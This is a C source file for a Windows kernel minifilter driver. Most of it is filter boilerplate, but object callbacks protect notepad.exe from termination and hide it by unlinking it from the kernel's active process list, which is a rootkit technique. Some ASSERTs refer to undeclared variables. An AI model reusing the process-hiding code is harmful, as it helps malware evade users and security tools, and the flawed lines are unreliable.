#include "StdAfx.h"

PFLT_FILTER g_hFilter;
MYMINIFLT_DATA g_MyMiniFlt;

DRIVER_INITIALIZE DriverEntry;
NTSTATUS
DriverEntry (
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
    );

NTSTATUS
MiniFltUnload (
    _In_ FLT_FILTER_UNLOAD_FLAGS Flags
    );

NTSTATUS
MiniFltInstanceSetup (
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _In_ FLT_INSTANCE_SETUP_FLAGS Flags,
    _In_ DEVICE_TYPE VolumeDeviceType,
    _In_ FLT_FILESYSTEM_TYPE VolumeFilesystemType
    );

NTSTATUS
MiniFltInstanceQueryTeardown(
  _In_ PCFLT_RELATED_OBJECTS FltObjects,
  _In_ FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags
);

FLT_PREOP_CALLBACK_STATUS
MiniFltPreCreate(
  _Inout_ PFLT_CALLBACK_DATA Data,
  _In_ PCFLT_RELATED_OBJECTS FltObjects,
  _Flt_CompletionContext_Outptr_ PVOID* CompletionContext
);

FLT_POSTOP_CALLBACK_STATUS
MiniFltPostCreate(
  _Inout_ PFLT_CALLBACK_DATA Data,
  _In_ PCFLT_RELATED_OBJECTS FltObjects,
  _Inout_opt_ PVOID CbdContext,
  _In_ FLT_POST_OPERATION_FLAGS Flags
);

FLT_PREOP_CALLBACK_STATUS
MiniFltPreCleanup(
  _Inout_ PFLT_CALLBACK_DATA Data,
  _In_ PCFLT_RELATED_OBJECTS FltObjects,
  _Flt_CompletionContext_Outptr_ PVOID* CompletionContext
);


#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, MiniFltUnload)
#pragma alloc_text(PAGE, MiniFltContextCleanup)
#pragma alloc_text(PAGE, MiniFltInstanceSetup)
#endif

PVOID g_RegHandle = NULL;
OB_PREOP_CALLBACK_STATUS ObPreCallBack(
	_In_ PVOID RegContext, 
	_Inout_ POB_PRE_OPERATION_INFORMATION ObPreOperInfo
)
{
	CHAR ProcName[MAX_KPATH] = { 0 };
	PEPROCESS pEProc = (PEPROCESS)ObPreOperInfo->Object;

	UNREFERENCED_PARAMETER(RegContext);

	if (KeGetCurrentIrql() != PASSIVE_LEVEL) DbgPrint("KeGetCurrentIrql[0x%X]", KeGetCurrentIrql());

	MyStrNCopy(ProcName, (PCHAR)pEProc + g_ProcNameOffset, MAX_KPATH);
	if (*ProcName) {
		if (!_stricmp("notepad.exe", ProcName)) {
			if (ObPreOperInfo->Operation == OB_OPERATION_HANDLE_CREATE) {
				if (ObPreOperInfo->Parameters->CreateHandleInformation.DesiredAccess & PROCESS_TERMINATE) {
					ObPreOperInfo->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
					DbgPrint("Set Protect Process");
				}
			}
		}
	}
	else DbgPrint("Failed to Get Process Name");

	return OB_PREOP_SUCCESS;
}

VOID ObPostCallBack(
	_In_ PVOID RegContext, 
	_Inout_ POB_POST_OPERATION_INFORMATION OperInfo
)
{
	PEPROCESS pEProc = (PEPROCESS)OperInfo->Object;
	PLIST_ENTRY pListEntry;
	CHAR ProcName[MAX_KPATH] = { 0 };
	ULONG_PTR ProcAddress = (ULONG_PTR)pEProc;

	UNREFERENCED_PARAMETER(RegContext);

	MyStrNCopy(ProcName, (PCHAR)pEProc + g_ProcNameOffset, MAX_KPATH);
	if (*ProcName) {
		if (!_stricmp("notepad.exe", ProcName)) {
			pListEntry = (PLIST_ENTRY)((ULONG_PTR)ProcAddress + ACTIVE_PROCESS_LINKS);

			if (pListEntry->Flink == NULL || pListEntry->Blink == NULL) return;

			pListEntry->Flink->Blink = pListEntry->Blink;
			pListEntry->Blink->Flink = pListEntry->Flink;

			pListEntry->Flink = NULL;
			pListEntry->Blink = NULL;

			DbgPrint("Set Stealth Process");
		}
	}
	else DbgPrint("Failed to Get Process Name");

}

NTSTATUS StartProtectProcess()
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	OB_CALLBACK_REGISTRATION ObCBReg = { 0 };
	OB_OPERATION_REGISTRATION ObOperReg = { 0 };

	ObOperReg.ObjectType = PsProcessType;
	ObOperReg.PreOperation = ObPreCallBack;
	ObOperReg.PostOperation = ObPostCallBack;
	ObOperReg.Operations = OB_OPERATION_HANDLE_CREATE;

	ObCBReg.Version = OB_FLT_REGISTRATION_VERSION;
	ObCBReg.OperationRegistrationCount = 1;
	ObCBReg.OperationRegistration = &ObOperReg;
	RtlInitUnicodeString(&ObCBReg.Altitude, L"370071");
	ObCBReg.RegistrationContext = NULL;

	Status = ObRegisterCallbacks(&ObCBReg, &g_RegHandle);

	DbgPrint("ObRegisterCallbacks Status[0x%X]", Status);
	return Status;
}

VOID StopProtectProcess()
{
	if (g_RegHandle != NULL) ObUnRegisterCallbacks(g_RegHandle);
}


FLT_OPERATION_REGISTRATION Callbacks[] = {
    { IRP_MJ_CREATE,
      0,
      MiniFltPreCreate,
      MiniFltPostCreate },

    { IRP_MJ_CLEANUP,
      FLTFL_OPERATION_REGISTRATION_SKIP_PAGING_IO,
      MiniFltPreCleanup,
      NULL },

    { IRP_MJ_OPERATION_END }
};

const FLT_CONTEXT_REGISTRATION ContextRegistration[] = {
    { FLT_VOLUME_CONTEXT, 
    0, 
    MiniFltContextCleanup, 
    sizeof(VOLUME_CONTEXT), 
    TAG_CONTEXT },

    { FLT_CONTEXT_END }
};

FLT_REGISTRATION FilterRegistration = {
    sizeof( FLT_REGISTRATION ),                     //  Size
    FLT_REGISTRATION_VERSION,                       //  Version
    0,                                              //  Flags
    ContextRegistration,                            //  Context
    Callbacks,                                      //  Operation callbacks
    MiniFltUnload,                                  //  Filters unload routine
    MiniFltInstanceSetup,                           //  InstanceSetup routine
    MiniFltInstanceQueryTeardown,                   //  InstanceQueryTeardown routine
    NULL,                                           //  InstanceTeardownStart routine
    NULL,                                           //  InstanceTeardownComplete routine
    NULL, NULL, NULL                                //  Unused naming support callbacks
};

NTSTATUS
DriverEntry (
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
    )
{
    NTSTATUS status;

    ExInitializeDriverRuntime( DrvRtPoolNxOptIn );

    UNREFERENCED_PARAMETER( RegistryPath );



    status = FltRegisterFilter( DriverObject,
                                &FilterRegistration,
                                &g_hFilter);

    if (!NT_SUCCESS( status )) {

        return status;
    }

    status = FltStartFiltering(g_hFilter);

    if (!NT_SUCCESS( status )) {

        FltUnregisterFilter(g_hFilter);
    }

    return status;
}

NTSTATUS
MiniFltUnload (
  _In_ FLT_FILTER_UNLOAD_FLAGS Flags
  )
{
  UNREFERENCED_PARAMETER(Flags);

  PAGED_CODE();


  FltUnregisterFilter(g_hFilter);

  return STATUS_SUCCESS;
}

NTSTATUS
MiniFltInstanceSetup(
  _In_ PCFLT_RELATED_OBJECTS FltObjects,
  _In_ FLT_INSTANCE_SETUP_FLAGS Flags,
  _In_ DEVICE_TYPE VolumeDeviceType,
  _In_ FLT_FILESYSTEM_TYPE VolumeFilesystemType
)
{
	NTSTATUS Status = STATUS_SUCCESS;
	PDEVICE_OBJECT DeviceObj = NULL;
	PVOLUME_CONTEXT pVolumeContext = NULL;
	ULONG RetLen, VolumePropLen = sizeof(FLT_VOLUME_PROPERTIES) + 512;
	PFLT_VOLUME_PROPERTIES VolumeProp = NULL;
	PUNICODE_STRING WorkingName;
	USHORT BufSize;
	PCHAR DeviceType = "", FileSystem = "", Flag = "";

	PAGED_CODE();

	if (VolumeDeviceType == FILE_DEVICE_DISK_FILE_SYSTEM)
		DeviceType = "FILE_DEVICE_DISK_FILE_SYSTEM";
	else if (VolumeDeviceType == FILE_DEVICE_CD_ROM_FILE_SYSTEM)
		DeviceType = "FILE_DEVICE_CD_ROM_FILE_SYSTEM";
	else if (VolumeDeviceType == FILE_DEVICE_NETWORK_FILE_SYSTEM)
		DeviceType = "FILE_DEVICE_NETWORK_FILE_SYSTEM";

	if (VolumeFilesystemType == FLT_FSTYPE_NTFS)
		FileSystem = "FLT_FSTYPE_NTFS";
	else if (VolumeFilesystemType == FLT_FSTYPE_FAT)
		FileSystem = "FLT_FSTYPE_FAT";
	else if (VolumeFilesystemType == FLT_FSTYPE_CDFS)
		FileSystem = "FLT_FSTYPE_CDFS";
	else if (VolumeFilesystemType == FLT_FSTYPE_NFS)
		FileSystem = "FLT_FSTYPE_NFS";
	else if (VolumeFilesystemType == FLT_FSTYPE_REFS)
		FileSystem = "FLT_FSTYPE_REFS";

	if (FlagOn(Flags, FLTFL_INSTANCE_SETUP_AUTOMATIC_ATTACHMENT)) {
		Flag = "FLTFL_INSTANCE_SETUP_AUTOMATIC_ATTACHMENT";
	}
	else if (FlagOn(Flags, FLTFL_INSTANCE_SETUP_MANUAL_ATTACHMENT))
		Flag = "FLTFL_INSTANCE_SETUP_MANUAL_ATTACHMENT";

	if (*FileSystem) {
		DbgPrint("DeviceType:%s Filesystem:%s Flag:%s Volume:%p Instance:%p\n",
			DeviceType, FileSystem, Flag, FltObjects->Volume, FltObjects->Instance);
	}
	else {
    DbgPrint("DeviceType:%s Filesystem:%u Flag:%s Volume:%p Instance:%p\n",
			DeviceType, VolumeFilesystemType, Flag, FltObjects->Volume, FltObjects->Instance);
	}

  VolumeProp = MyAllocNonPagedPool(VolumePropLen, &g_NonPagedPoolCnt);
	if (!VolumeProp) return Status;

	__try {
		Status = FltAllocateContext(FltObjects->Filter, FLT_VOLUME_CONTEXT, sizeof(VOLUME_CONTEXT),
			NonPagedPool, &pVolumeContext);
		if (!NT_SUCCESS(Status)) __leave;

		Status = FltGetVolumeProperties(FltObjects->Volume, VolumeProp, VolumePropLen, &RetLen);
		if (!NT_SUCCESS(Status)) __leave;

		memset(pVolumeContext, 0, sizeof(VOLUME_CONTEXT));

		pVolumeContext->FileSystemType = VolumeFilesystemType;
		if (VolumeProp->DeviceCharacteristics & FILE_REMOVABLE_MEDIA)
			pVolumeContext->DriveType = DRIVE_REMOVABLE;

		ASSERT((VolProp->SectorSize == 0) || (VolProp->SectorSize >= MIN_SECTOR_SIZE));

		pVolumeContext->SectorSize = max(VolumeProp->SectorSize, MIN_SECTOR_SIZE);
		pVolumeContext->VolumeName.Buffer = NULL;

		Status = FltGetDiskDeviceObject(FltObjects->Volume, &DeviceObj);
		if (NT_SUCCESS(Status)) {
#pragma prefast(suppress:__WARNING_USE_OTHER_FUNCTION, "Used to maintain compatability with Win 2k")
			Status = IoVolumeDeviceToDosName(DeviceObj, &pVolumeContext->VolumeName);
		}

		if (NT_SUCCESS(Status)) {
			DbgPrint("DOS Volume Name: %wZ (%s)\n", &pVolumeContext->VolumeName,
				pVolumeContext->DriveType == DRIVE_REMOVABLE ? "DRIVE_REMOVABLE" : "DRIVE_FIXED");
		}
		else {
			ASSERT(pVolContext->Name.Buffer == NULL);

			if (VolumeProp->RealDeviceName.Length > 0) WorkingName = &VolumeProp->RealDeviceName;
			else if (VolumeProp->FileSystemDeviceName.Length > 0) WorkingName = &VolumeProp->FileSystemDeviceName;
			else {
        DbgPrint("No Name. Don't attach.\n");
				Status = STATUS_FLT_DO_NOT_ATTACH;
				__leave;
			}

			BufSize = WorkingName->Length + sizeof(WCHAR);

			// Now allocate a buffer to hold this name
			pVolumeContext->VolumeName.Buffer = MyAllocNonPagedPool(BufSize, &g_NonPagedPoolCnt);
			if (pVolumeContext->VolumeName.Buffer == NULL) {
        DbgPrint("Memory allocation failed.\n");
				Status = STATUS_INSUFFICIENT_RESOURCES;
				__leave;
			}

			pVolumeContext->VolumeName.Length = 0;
			pVolumeContext->VolumeName.MaximumLength = BufSize;
			RtlCopyUnicodeString(&pVolumeContext->VolumeName, WorkingName);

      if (!_wcsnicmp(pVolumeContext->VolumeName.Buffer, L"\\Device\\Mup", pVolumeContext->VolumeName.Length / 2) ||
        !_wcsnicmp(pVolumeContext->VolumeName.Buffer, L"\\Device\\LanmanRedirector", pVolumeContext->VolumeName.Length / 2) ||
        !_wcsnicmp(pVolumeContext->VolumeName.Buffer, L"\\FileSystem\\MRxSmb", pVolumeContext->VolumeName.Length / 2)) {
        pVolumeContext->DriveType = DRIVE_NETWORK;
      }

			RtlAppendUnicodeToString(&pVolumeContext->VolumeName, L":");

			if (pVolumeContext->DriveType == DRIVE_FIXED)
        DbgPrint("NT Volume Name: %wZ (DRIVE_FIXED)\n", &pVolumeContext->VolumeName);
      else if (pVolumeContext->DriveType == DRIVE_NETWORK)
        DbgPrint("NT Volume Name: %wZ (DRIVE_NETWORK)\n", &pVolumeContext->VolumeName);
			else 
        DbgPrint("NT Volume Name: %wZ (DRIVE_REMOVABLE)\n", &pVolumeContext->VolumeName);

		}

		Status = FltSetVolumeContext(FltObjects->Volume, FLT_SET_CONTEXT_KEEP_IF_EXISTS, pVolumeContext, NULL);
		if (Status == STATUS_FLT_CONTEXT_ALREADY_DEFINED) Status = STATUS_SUCCESS;
	}
	__finally {
		if (pVolumeContext != NULL) {

			FltReleaseContext(pVolumeContext);
		}

		if (DeviceObj != NULL) {

			ObDereferenceObject(DeviceObj);
		}

    MyFreeNonPagedPool(VolumeProp, &g_NonPagedPoolCnt);
	}

	return Status;
}

NTSTATUS
MiniFltInstanceQueryTeardown (
  _In_ PCFLT_RELATED_OBJECTS FltObjects,
  _In_ FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags
  )
{
  UNREFERENCED_PARAMETER(FltObjects);
  UNREFERENCED_PARAMETER(Flags);

  PAGED_CODE();

  return STATUS_SUCCESS;
}

ULONGLONG GetFileId(
	_In_ PCFLT_RELATED_OBJECTS FltObjects
)
{
	NTSTATUS Status;
	FLT_FILESYSTEM_TYPE Type;
	FILE_REFERENCE FileRef = { 0 };

	Status = FltGetFileSystemType(FltObjects->Instance, &Type);
	if (NT_SUCCESS(Status)) {
		if (Type == FLT_FSTYPE_REFS) {
			FILE_ID_INFORMATION FileIdInfo;

			Status = FltQueryInformationFile(FltObjects->Instance, FltObjects->FileObject, &FileIdInfo,
				sizeof(FILE_ID_INFORMATION), FileIdInformation, NULL);

			if (NT_SUCCESS(Status)) {
				RtlCopyMemory(&FileRef.FileId128, &FileIdInfo.FileId, sizeof(FileRef.FileId128));
			}
		}
		else {
			FILE_INTERNAL_INFORMATION FileInternalInfo;

			Status = FltQueryInformationFile(FltObjects->Instance, FltObjects->FileObject, &FileInternalInfo,
				sizeof(FILE_INTERNAL_INFORMATION), FileInternalInformation, NULL);

			if (NT_SUCCESS(Status)) {
				FileRef.FileId64.Value = FileInternalInfo.IndexNumber.QuadPart;
				FileRef.FileId64.UpperZeroes = 0LL;
			}
		}
	}

	return FileRef.FileId64.Value;
}

PCHAR MakeFilePath(
	_In_ PVOLUME_CONTEXT pVolContext,
	_In_ PFLT_FILE_NAME_INFORMATION NameInfo
)
{
	ULONG Len = 0;
	PWCHAR UACPath = NULL;
	WCHAR ObjPathW[MAX_KPATH] = { 0 };
	PCHAR ObjPath = MyAllocNonPagedPool(MAX_KPATH, &g_NonPagedPoolCnt);

	if (!ObjPath) return NULL;

	memset(ObjPath, 0, sizeof(ObjPath));

	Len += MyStrNCopyW(ObjPathW + Len, pVolContext->VolumeName.Buffer,
		pVolContext->VolumeName.Length / 2, MAX_KPATH - Len);

	if (!NameInfo->ParentDir.Buffer || NameInfo->ParentDir.Length > 260) {
		Len += MyStrNCopyW(ObjPathW + Len, L"\\", 1, MAX_KPATH - Len);
	}
	else {
		Len += MyStrNCopyW(ObjPathW + Len, NameInfo->ParentDir.Buffer,
			NameInfo->ParentDir.Length / 2, MAX_KPATH - Len);
		Len += MyStrNCopyW(ObjPathW + Len, NameInfo->FinalComponent.Buffer,
			NameInfo->FinalComponent.Length / 2, MAX_KPATH - Len);
	}

	MyWideCharToChar(ObjPathW, ObjPath, MAX_KPATH);

	return ObjPath;
}

PCHAR MakeFilePathByFileObj(
	_In_ PVOLUME_CONTEXT	pVolContext,
	_In_ PFILE_OBJECT FileObject,
	_In_ PCHAR CallFuncName
)
{
	WCHAR ObjPathW[MAX_KPATH], * pBuf, * pDrive;
	PCHAR ObjPath;
	ULONG Len = 0;

	if (!FileObject || !FileObject->FileName.Buffer || FileObject->FileName.Length == 0) return NULL;

	ObjPath = MyAllocNonPagedPool(MAX_KPATH, &g_NonPagedPoolCnt);
	if (!ObjPath) return NULL;

	MyStrNCopyW(ObjPathW, FileObject->FileName.Buffer, FileObject->FileName.Length / 2, MAX_KPATH);
	if (pVolContext->DriveType == DRIVE_NETWORK) {
		//2008: \;LanmanRedirector\;Z:0000000000028ab3\192.168.150.202\D$\desktop.ini
		//2012: \;Z:0000000000027a36\192.168.150.202\Enc
		pBuf = wcschr(ObjPathW, L':');
		if (pBuf && (pBuf + 1)) {
			pBuf = wcschr(pBuf, L'\\');
			if (pBuf && (pBuf + 1)) {
				Len = MySNPrintfW(ObjPathW, MAX_KPATH, L"\\"); // prefix '\'
				MyStrNCopyW(ObjPathW + Len, pBuf, -1, MAX_KPATH - Len);
			}
		}
		else {
			Len = MySNPrintfW(ObjPathW, MAX_KPATH, L"\\"); // prefix '\'
			MyStrNCopyW(ObjPathW + Len, ObjPathW, -1, MAX_KPATH - Len);
		}
	}
	else {
		if (!_wcsicmp(FileObject->FileName.Buffer, L"\\Device")) {
			pBuf = wcschr(ObjPathW, L'\\');
			if (pBuf && (pBuf + 1)) {
				pBuf = wcschr(pBuf + 1, L'\\');
				if (pBuf) {
					pDrive = wcschr(pBuf, L':');
					if (!pDrive) Len = MyStrNCopyW(ObjPathW, pVolContext->VolumeName.Buffer, pVolContext->VolumeName.Length / 2, MAX_KPATH);

					MyStrNCopyW(ObjPathW + Len, pBuf, -1, MAX_KPATH - Len);
				}
			}
		}
		else {
			if (pVolContext->VolumeName.Length / 2 >= (USHORT)strlen("X:") && pVolContext->VolumeName.Buffer[1] == L':') {
				pDrive = wcschr(ObjPathW, L':');
				if (!pDrive) {
					Len = MyStrNCopyW(ObjPathW, pVolContext->VolumeName.Buffer, pVolContext->VolumeName.Length / 2, MAX_KPATH);
					if (Len > 2) Len += MySNPrintfW(ObjPathW + Len, MAX_KPATH - Len, L"\\");
				}

				MyStrNCopyW(ObjPathW + Len, ObjPathW, -1, MAX_KPATH);
			}
		}
	}

	if (ObjPathW[0] != 0) {
		MyWideCharToChar(ObjPathW, ObjPath, MAX_KPATH);
	}
	else
	{
		MyFreeNonPagedPool(ObjPath, &g_NonPagedPoolCnt);
		ObjPath = NULL;
	}

	return ObjPath;
}

FLT_PREOP_CALLBACK_STATUS
MiniFltPreCreate(
  _Inout_ PFLT_CALLBACK_DATA Data,
  _In_ PCFLT_RELATED_OBJECTS FltObjects,
  _Flt_CompletionContext_Outptr_ PVOID* CompletionContext
)
{
  UNREFERENCED_PARAMETER(Data);
  UNREFERENCED_PARAMETER(FltObjects);
  UNREFERENCED_PARAMETER(CompletionContext);
  FLT_PREOP_CALLBACK_STATUS Status = FLT_PREOP_SYNCHRONIZE;

  return Status;
}

FLT_POSTOP_CALLBACK_STATUS
MiniFltPostCreate(
  _Inout_ PFLT_CALLBACK_DATA Data,
  _In_ PCFLT_RELATED_OBJECTS FltObjects,
  _Inout_opt_ PVOID CbdContext,
  _In_ FLT_POST_OPERATION_FLAGS Flags
)
{
  UNREFERENCED_PARAMETER(Data);
  UNREFERENCED_PARAMETER(FltObjects);
  UNREFERENCED_PARAMETER(CbdContext);
  UNREFERENCED_PARAMETER(Flags);

  return FLT_POSTOP_FINISHED_PROCESSING;
}

FLT_PREOP_CALLBACK_STATUS
MiniFltPreCleanup(
  _Inout_ PFLT_CALLBACK_DATA Data,
  _In_ PCFLT_RELATED_OBJECTS FltObjects,
  _Flt_CompletionContext_Outptr_ PVOID* CompletionContext
)
{
  UNREFERENCED_PARAMETER(Data);
  UNREFERENCED_PARAMETER(FltObjects);
  UNREFERENCED_PARAMETER(CompletionContext);

  PAGED_CODE();

  return FLT_PREOP_SUCCESS_NO_CALLBACK;
}